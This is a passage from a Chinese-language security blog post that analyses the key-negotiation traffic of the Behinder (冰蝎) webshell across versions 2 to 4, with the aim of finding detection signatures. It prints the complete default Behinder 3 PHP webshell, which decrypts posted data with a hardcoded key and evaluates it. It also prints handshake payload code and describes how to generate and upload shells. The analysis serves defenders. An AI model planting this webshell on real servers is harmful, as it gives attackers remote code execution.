class="string">&quot;status&quot;</span>] = <span class="title function_ invoke__">base64_encode</span>(<span class="string">&quot;success&quot;</span>);</span><br><span class="line">    <span class="variable">$result</span>[<span class="string">&quot;msg&quot;</span>] = <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$content</span>);</span><br><span class="line">    <span class="variable">$key</span> = <span class="variable">$_SESSION</span>[<span class="string">&#x27;k&#x27;</span>];</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">encrypt</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$result</span>),<span class="variable">$key</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">encrypt</span>(<span class="params"><span class="variable">$data</span>,<span class="variable">$key</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(!<span class="title function_ invoke__">extension_loaded</span>(<span class="string">&#x27;openssl&#x27;</span>))</span><br><span class="line">    	&#123;</span><br><span class="line">    		<span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$data</span>);<span class="variable">$i</span>++) &#123;</span><br><span class="line">    			 <span class="variable">$data</span>[<span class="variable">$i</span>] = <span class="variable">$data</span>[<span class="variable">$i</span>]^<span class="variable">$key</span>[<span class="variable">$i</span>+<span class="number">1</span>&amp;<span class="number">15</span>];</span><br><span class="line">    			&#125;</span><br><span class="line">			<span class="keyword">return</span> <span class="variable">$data</span>;</span><br><span class="line">    	&#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    	&#123;</span><br><span class="line">    		<span class="keyword">return</span> <span class="title function_ invoke__">openssl_encrypt</span>(<span class="variable">$data</span>, <span class="string">&quot;AES128&quot;</span>, <span class="variable">$key</span>);</span><br><span class="line">    	&#125;</span><br><span class="line">&#125;<span class="variable">$content</span>=<span class="string">&quot;f61e7813-2848-4fe0-b658-d24f5c019f03&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">main</span>(<span class="variable">$content</span>);</span><br></pre></td></tr></table></figure>
+<p>可以看到这里协商密钥的依据是 content，找源码发现是随机生成的 uuid，长度固定，或许可以作为一种检测特征。如果服务端能够正确解码 content，这证明双方持有的密钥一致，可以开始通信了。</p>
+<h2 id="冰蝎-3-预共享密钥无明文交互"><a class="markdownIt-Anchor" href="#冰蝎-3-预共享密钥无明文交互"></a> 冰蝎 3 预共享密钥，无明文交互</h2>
+<p>首先，什么叫做预共享密钥？所谓预共享，即在未连接时已完成密钥共享，冰蝎 3 新增 shell 设置有参数密码。默认密钥是作者的 id 的 MD5 值，而 aes 密钥一般为 128bit，16 字节，于是取 key 值的 MD5 前十六位作为密钥。开始连接时，客户端会发起一个 POST 请求，发送使用 key 的 MD5 前十六位加密密文的 base64 编码，若服务端能够正确解码，那么证明本次密钥协商成功。
+<img src="https://cdn.jsdelivr.net/gh/c4ooc0/blog-image/blog/images/Fu0ltOdco3qU_W_RccPBhJ_T_bzR.png" alt="" />
+以下是冰蝎 3 的默认 PHP 木马：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@<span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line">    <span class="variable">$key</span>=<span class="string">&quot;e45e329feb5d925b&quot;</span>; <span class="comment">//该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond</span></span><br><span class="line">	<span class="variable">$_SESSION</span>[<span class="string">&#x27;k&#x27;</span>]=<span class="variable">$key</span>;</span><br><span class="line">	<span class="title function_ invoke__">session_write_close</span>();</span><br><span class="line">	<span class="variable">$post</span>=<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;php://input&quot;</span>);</span><br><span class="line">	<span class="keyword">if</span>(!<span class="title function_ invoke__">extension_loaded</span>(<span class="string">&#x27;openssl&#x27;</span>))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="variable">$t</span>=<span class="string">&quot;base64_&quot;</span>.<span class="string">&quot;decode&quot;</span>;</span><br><span class="line">		<span class="variable">$post</span>=<span class="variable">$t</span>(<span class="variable">$post</span>.<span class="string">&quot;&quot;</span>);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$post</span>);<span class="variable">$i</span>++) &#123;</span><br><span class="line">    			 <span class="variable">$post</span>[<span class="variable">$i</span>] = <span class="variable">$post</span>[<span class="variable">$i</span>]^<span class="variable">$key</span>[<span class="variable">$i</span>+<span class="number">1</span>&amp;<span class="number">15</span>];</span><br><span class="line">    			&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="variable">$post</span>=<span class="title function_ invoke__">openssl_decrypt</span>(<span class="variable">$post</span>, <span class="string">&quot;AES128&quot;</span>, <span class="variable">$key</span>);</span><br><span class="line">	&#125;</span><br><span class="line">    <span class="variable">$arr</span>=<span class="title function_ invoke__">explode</span>(<span class="string">&#x27;|&#x27;</span>,<span class="variable">$post</span>);</span><br><span class="line">    <span class="variable">$func</span>=<span class="variable">$arr</span>[<span class="number">0</span>];</span><br><span class="line">    <span class="variable">$params</span>=<span class="variable">$arr</span>[<span class="number">1</span>];</span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">C</span></span>&#123;<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"><span class="variable">$p</span></span>) </span>&#123;<span class="keyword">eval</span>(<span class="variable">$p</span>.<span class="string">&quot;&quot;</span>);&#125;&#125;</span><br><span class="line">    @<span class="title function_ invoke__">call_user_func</span>(<span class="keyword">new</span> <span class="title function_ invoke__">C</span>(),<span class="variable">$params</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>其基本功能就是解密 payload，执行其携带的函数，做了一定的免杀处理。本段更关注其加解密部分，参数 key 就是新建 shell 时参数密码值 MD5 的前 16 位，刚好 128bit。这个值当然也可以修改，改成别的字符串，PHP 马的参数 key 也需要更改成该字符串的 MD5 值前 16 位。
+协商密钥的 GET 请求包是冰蝎 1、2 的重要特征，冰蝎 3 采用预共享密钥，规避了密钥的明文传输，使流量更加隐蔽，在当时是对各家 waf 的一个全新考验。
+<img src="https://cdn.jsdelivr.net/gh/c4ooc0/blog-image/blog/images/Ft6mzNQcwOvTAdNHg6lH8vPEQdQz.png" alt="" />
+建立连接的 POST 请求包的 Payload 功能是让服务端执行以下代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">@<span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">main</span>(<span class="params"><span class="variable">$content</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="variable">$result</span> = <span class="keyword">array</span>();</span><br><span class="line">	<span class="variable">$result</span>[<span class="string">&quot;status&quot;</span>] = <span class="title function_ invoke__">base64_encode</span>(<span class="string">&quot;success&quot;</span>);</span><br><span class="line">	<span class="variable">$result</span>[<span class="string">&quot;msg&quot;</span>] = <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$content</span>);</span><br><span class="line">	<span class="variable">$key</span> = <span class="variable">$_SESSION</span>[<span class="string">&#x27;k&#x27;</span>];</span><br><span class="line">	<span class="keyword">echo</span> <span class="title function_ invoke__">encrypt</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$result</span>),<span class="variable">$key</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">encrypt</span>(<span class="params"><span class="variable">$data</span>,<span class="variable">$key</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(!<span class="title function_ invoke__">extension_loaded</span>(<span class="string">&#x27;openssl&#x27;</span>))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$data</span>);<span class="variable">$i</span>++) &#123;</span><br><span class="line">			<span class="variable">$data</span>[<span class="variable">$i</span>] = <span class="variable">$data</span>[<span class="variable">$i</span>]^<span class="variable">$key</span>[<span class="variable">$i</span>+<span class="number">1</span>&amp;<span class="number">15</span>];</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> <span class="variable">$data</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="title function_ invoke__">openssl_encrypt</span>(<span class="variable">$data</span>, <span class="string">&quot;AES128&quot;</span>, <span class="variable">$key</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;<span class="variable">$content</span>=<span class="string">&quot;Y3dDMXpSa2o3OURScHlpcWNMVGVnNEt2ZVUyckR3SkJkcnVZakx4aGRXVnY3MkhkdHBkcFdYMXpJYkRQWVRPWmNhUDRMelhLdVZtT0VHczhCdDdqbmZQME5vOFEyVDdzTTNhajVHZWp4a2FHRkxiSU1UT1U1a0VWeGJIbmRwTkluU3liTkRienQ2QURXbllqOVZRNzRkbktBaGJVeEt2azFvM3M2MWNJU1pMZk1vQWdjY2Z3QnhMRHR1TnlETldaamJKVE8yOTFsU2pvak5jOGdrT2pKYlFwMTIzZnhSUXRHVmhrY05hdmNPbzV5a2tVR2JWQ2s=&quot;</span>;<span class="variable">$content</span>=<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$content</span>);</span><br><span class="line"><span class="title function_ invoke__">main</span>(<span class="variable">$content</span>);</span><br></pre></td></tr></table></figure>
+<p>其中参数 content 就是本次密钥协商的凭证，服务段会用之前提到写入冰蝎 3PHP 马 AES 加密 content 内容，以响应的形式发回客户端。客户端再用协商的密钥解密响应包的 body，若有 content 相同，就代表客户端服务端持有的密钥一致，就可以开始愉快的通信。比起冰蝎 2 使用固定长度的 content 作为凭证，冰蝎 3 的 content 是 3000 字符以上的随机长度字符串，更添隐蔽性。
+<img src="https://cdn.jsdelivr.net/gh/c4ooc0/blog-image/blog/images/Fg5TALp7S6xmw01TTMyl2uamn_ci.png" alt="" />
+若服务端不能正确解码，则表示密钥错误或其他原因，一般连接失败冰蝎都会提示原因。如果第一个 POST 请求没有被及时或正确响应，客户端会发送第二次 POST 请求，若依旧未被正确解码，则恢复冰蝎 1 的密钥交换方式。如上图所示，一次 POST 请求的响应会 set 一个 cookie，两次 POST 请求 set 了两个 cookie；由于解码失败，上传的 webshell 中也没有配置处理 GET 请求的方法，于是 GET 请求的响应 body 是空的。</p>
+<h2 id="冰蝎-4-密钥写入木马"><a class="markdownIt-Anchor" href="#冰蝎-4-密钥写入木马"></a> 冰蝎 4 密钥写入木马</h2>
+<p>冰蝎 4 的 webshell 可以完全自定义加解密方式，作者称之为通信协议。到冰蝎 4.0.5，加密方式有以下几种：default_xor、default_xor_base64、default_aes、default_image、default_json、aes_with_magic。其中看到 github 上 issue 中提到 default_xor 可破解，本地测试使用 4.0.3 版本，default_xor 马连接不上，改其他加密方式就好了。使用前，需先配置传输协议，选择相应的协议名称，点击生成服务器。可以修改加解密代码，在下方测试加解密结果，最后点击保存。然后在冰蝎 jar 包的目录下会生成 server 文件夹，将其中的木马上传即可。
+<img src="https://cdn.jsdelivr.net/gh/c4ooc0/blog-image/blog/images/Fp2UxRXmqy9DUn42YOP1RZXDRQTs.png" alt="" />
+冰蝎 4 新增 shell 不需要任何参数，但必须指定传输协议，相应的传输协议需在上面的本步骤中保存到本地。
+<img src="https://cdn.jsdelivr.net/gh/c4ooc0/blog-image/blog/images/FnZm4jwvMztKVtm55kWQhWyPfIwD.png" alt="" />
+之后使用 default_aes 方式作为示例：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">@<span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">main</span>(<span class="params"><span class="variable">$content</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="variable">$result</span> = <span class="keyword">array</span>();</span><br><span class="line">   <span class="variable">$result</span>[<span class="string">&quot;status&quot;</span>] = <span class="title function_ invoke__">base64_encode</span>(<span class="string">&quot;success&quot;</span>);</span><br><span class="line">    <span class="variable">$result</span>[<span class="string">&quot;msg&quot;</span>] = <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$content</span>);</span><br><span class="line">    @<span class="title function_ invoke__">session_start</span>();  <span class="comment">//初始化session，避免connect之后直接background，后续getresult无法获取cookie</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">encrypt</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$result</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">   <span class="function"><span class="keyword">function</span> <span class="title">Encrypt</span>(<span class="params"><span class="variable">$data</span></span>)</span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">      <span class="variable">$key</span>=<span class="string">&quot;e45e329feb5d925b&quot;</span>; <span class="comment">//该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond</span></span><br><span class="line">      <span class="keyword">return</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">openssl_encrypt</span>(<span class="variable">$data</span>, <span class="string">&quot;AES-128-ECB&quot;</span>, <span class="variable">$key</span>,OPENSSL_PKCS1_PADDING));</span><br><span class="line">   &#125;</span><br><span class="line"><span class="variable">$content</span>=<span class="string">&quot;MzZjSHFEbUp2akZVSWNYVUhGb3Q4bnBQQVkzeXV6U2xEcWU0TjVsNEg1Y3ZCRmw3cnZrQ2ZXdzlsaVpzekxjcTE3b3JKT3hiMVVWTXVDNlNjNHplUFFnWk1PZjd0eWxvWEg3TTI2RGdCdDI2Ylg2dkx0cUNydmUzQ0lCMkg4WEZBbExEeEZDZHVyOUV0d3AwMnZJWUdKWHVScHA2YzR0VEozSHlldGtuc2JreW9NclpFSGJwZkMzT1NaSTFEMXVIQ211RFNTeFE0dTRWcDF5MUNEVXFGTUViNzZLaVRKYk5NejZxSlZGSTJBRzBxVUFidXVnOWxxbGVBbVN1cDJ3MEN0cTNlb2xLSGlJYkhBSk1RUVhYZVFyVmtjT2tTQU02S1plV25MYXdSaHUwZnVSRGU1dFRCR3NnVjB2bUljQzNZeFZLRDJnSVRDVVVBOHk5b0ZIb0V6NDQwTmVCTTJEWHVjQW5GakR4Mm9rdkdaMmpXNllVOExuZExkNUEydmE4dzFGTk1wRTdVeEs1a2ZCZG1QZktYVG9wcWYzanpSNGhEM2NIVGN3b3YyUHdMS1d5cVNLWkNWZzZOTWlSN0NvdHNkQVl0WWpGM1FDOEVJNUwyZ0hwRjRsZFVtM0hsekxvQjVROFBualV3cUZubXU4WWxndnMxWFR5ZkVJRHZQQXZqWW84b3htcjhoY254cUVQaHc1eG9VOUJHSnhFVThYOU5QeE52VWpIakhGTVp4U1NwSkJZczZDQnhRQ2JFcFJKYnBhZTBQSjh5eldjNWxBU3Z2ckYyZUw2RGNpczJJZzEwamhLa293ZTR1dFIxQXlOU3dxWWlZNVdrRFo0UjBXbHU0WTVEdkVIOTVGWlRUN0hHOWxEU0F0dXR5elFDUEdOOXlXNWl0NVFjbml3T0NaZmY3TzBFVlhzSzFRT1dvNXd3NmloZDVJMUZsbDlxcWMzVklxTjQ2UVVnTU5qOEtKNjFQdXNMendlRk1KNUMycFBoOFlFTko0VjNkUklEdkdKTFg3WEFBRFltZ284TDFmZko3bzlCUlpkT2E0SEY5UkNLc0RKMFNFWlg2aDk4Y2lBb2FwcmVvelFpSTVoSnp3ajBiQXFRWjFFS1hROEJCdWJvQTVqNWROdVRUYlBGTmo3WkNpWndHdUhGMXhBUVRLdFFkODdQNEFTaW82aTZOVHFYbVh6ZWZDMklQZ0N3YzJpeXBZNjdDT1o0VVBKd1JUYUpNSEdmUnhUMTVoNWV1M2VMNHZpNUNYYTdVak84VHY5N0FDS0dweUVTRGd6aXZUbFZoTldRcVk5cEtZUlViakhhTEcyN0Vhd2ZCZHhvMWdtWTNCVlI0bzNwbm9QdmJTUkkzaE9DVFl6ZVhXb1BIeE9NdXEydmZYM1E3dkJEUXk1VDBXVVVHeEdkS2phV3huQ2s4QUJjdHo5Y2tneVhPVks0SFJ3SmtTUFE0MUcwdGdXV0ZaNUttdE5oOHA5RWJDc25MWHlqaHFxd1FpbDlWeWs5Mk1IdVlWblhPNld0aEdSOWtiMGZsb1EzUEpRWWp1VURBdWZEcFp4Rm1EdnBNcjRCM1JZaFNwWnlZdDc3RUdrWFRtVVdkY0FYS0I1UjNCOXQ3Wkd1RlBiSk9xWXg0c2xmcDhiZWtIeGtCSUtvTTkyMHRHZXdTeDQ5WEFPQ2RYOHpWV1dZTElnQ09EcTlKRE5WVXRpa0V5SFlZT2YzUFdNdlR6cXJDeG9NcHdCTkt5d0FuT2t1STFFMWVmUElnOVpkcVFBbjd2a3E0V0lOOFlVaGNFYm5MUEZQY3BvYlJJVk5iSjhVTk9QdXcyZUdiSFF5cUtWOFkzUDRyZE41c01FNTJiMWRKWkZTZml3QVVRaUo4cTAySEtzcW42aGxWQnhOQXlRa1pJZzJCQmtrMFdVRzcwTkUxalFsTG1UYW92NTVqcmV1ZUhjS2hKVmVidkt4V3pyVmVKY2xBVFoxWGwxb0xwSFg2amdDbnBpd0I3NnpUcTRFTzhJdzFBdVlLNHpOa21Tb2RpWE1NZnBYekxmZ2gxZktSN1NhQms3ekZzNUc0NE9sTUpzeVM1VnhCMWV6ZnhaZUt5SkxEWldKemRYTVdTZHhSVE5hWXZYb3JpRzBpREgybDN4ZnpBYWJNZUd4ZVZTbDZBeGlUTzVoSjJIbTlsVTFjM214WXRNNmcxa1lGbm1VZElOUTFReVByTEZYdlIyckR0VTAzYWc4Y2w5WGFoYnI2eEx4VmpOZlhlOEFPa3psSVh3UTF4MUFjakV6eWpTanBJeERlSFN5NEFIOWZWc2ZZRmEwN1pjYUdoSGM4YXU5U21qejVueXBFbjNOeEFlMDNRT1E5N01YNngyUU1Y&quot;</span>;<span class="variable">$content</span>=<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$content</span>);</span><br><span class="line"><span class="title function_ invoke__">main</span>(<span class="variable">$content</span>);</span><br></pre></td></tr></table></figure>
+<p>冰蝎 4 的 default aes 模式传的 payload 是 AES/ECB/PKCS5Padding，和前几代冰蝎不同，所以冰蝎 4 并不能兼容前几代冰蝎马，需要注意。密钥协商方式与冰蝎 3 一致，content 的生成方式也相同，但第一次 POST 请求没有被正确或及时响应不再重发。连接成功之后，客户端会自动 POST 请求 phpinfo。</p>
+<h1 id="最后"><a class="markdownIt-Anchor" href="#最后"></a> 最后</h1>
+<p>冰蝎每个版本之间其他方面的流量特征都有细微变化，但都具体写出来文章就显得冗长了。最后简单提一下，内置 UA 头更新、程序定义 http 头部字段不同、心跳包变化（长度、内容）等。对于 shell 实体的其他功能实现上都有不小的改进，随便哪个方面都是能新写一篇文章的程度，这里就不多说了。
+冰蝎的演化史，也是冰蝎“隐蔽”史，从功能实现、连接方式中很多角度都已看出冰蝎越来越阴，防不胜防。从更新日志上可以看得出冰蝎作者更新勤奋，撰写这篇文章期间冰蝎 4 小版本就出了三个，值得学习。而且从反编译的源码来看，每个大版本之间都改了很多，几乎重构，背后可以看出作者技术在不断精进。从冰蝎 1 到冰蝎 4，即使 webshell 的原理没有太大改变，作者在编写工具时投入的奇思和对于需求的考量也有很多值得参考的地方。
+个人水平和时间都有限，还有一些功能没有实际测试，比如冰蝎 4 的二进制服务端等各种炫酷功能，有机会一定尝试一下。因为主要关注 PHP 马，对于 JSP、ASP 的细节没有深入研究，这里也有空补上。
+还有一点，虽然使用冰蝎加密流量能够规避关键字检测，但在护网期间学习到蓝队直接把 IDS 设备放在负载均衡后面，到 IDS 的流量理应都是明文，请求体还是加密的流量基本可以全封了（还是有误报概率的，建议结合实际情况来看）。
+参考资料：
+<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2774">利用动态二进制加密实现新型一句话木马之 PHP 篇</a>
+<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2799">利用动态二进制加密实现新型一句话木马之客户端篇</a>
+<a target="_blank" rel="noopener" href="https://github.com/rebeyond/Behinder">“冰蝎”动态二进制加密网站管理客户端</a></p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2022/07/19/Nmap%E6%9C%8D%E5%8A%A1%E8%AF%86%E5%88%AB%E6%8C%87%E7%BA%B9%E5%BA%93%E5%88%A9%E7%94%A8/" rel="prev" title="Nmap服务识别指纹库利用">
+                  <i class="fa fa-chevron-left"></i> Nmap服务识别指纹库利用
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2022/08/26/%E7%BD%91%E9%BC%8E%E6%9D%AF2022%20%E9%9D%92%E9%BE%99%E7%BB%84%20Crypto405%20WP/" rel="next" title="网鼎杯2022 青龙组 Crypto405 WP">
+                  网鼎杯2022 青龙组 Crypto405 WP <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">c4ooc0</span>
+</div>
+<div class="wordcount">
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-line"></i>
+    </span>
+    <span title="站点总字数">19k</span>
+  </span>
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">1:09</span>
+  </span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>
+
+  
+
+
+
+
+
+  
+
+
+
+
+  
+
+  <script class="next-config" data-name="enableMath" type="application/json">false</script><script class="next-config" data-name="mathjax" type="application/json">{"enable":true,"per_page":true,"tags":"none","engine":"mathjax","js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/mathjax/3.2.2/es5/tex-mml-chtml.js","integrity":"sha256-MASABpB4tYktI2Oitl4t+78w/lyA+D7b/s9GEP0JOGI="}}</script>
+<script src="/js/third-party/math/mathjax.js"></script>
+
+
+<script class="next-config" data-name="exif" type="application/json">"{FocalLength}mm f/{FNumber} {ExposureTime}s"</script>
+<script src="https://fastly.jsdelivr.net/npm/exif-js@2/exif.min.js"></script>
+<script src="/lib/exif.js"></script>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/wanko.model.json"},"display":{"position":"right","width":145,"height":315},"mobile":{"show":true,"scale":0.5},"react":{"opacityDefault":0.7,"opacityOnHover":0.8},"log":false});</script></body>
+</html>
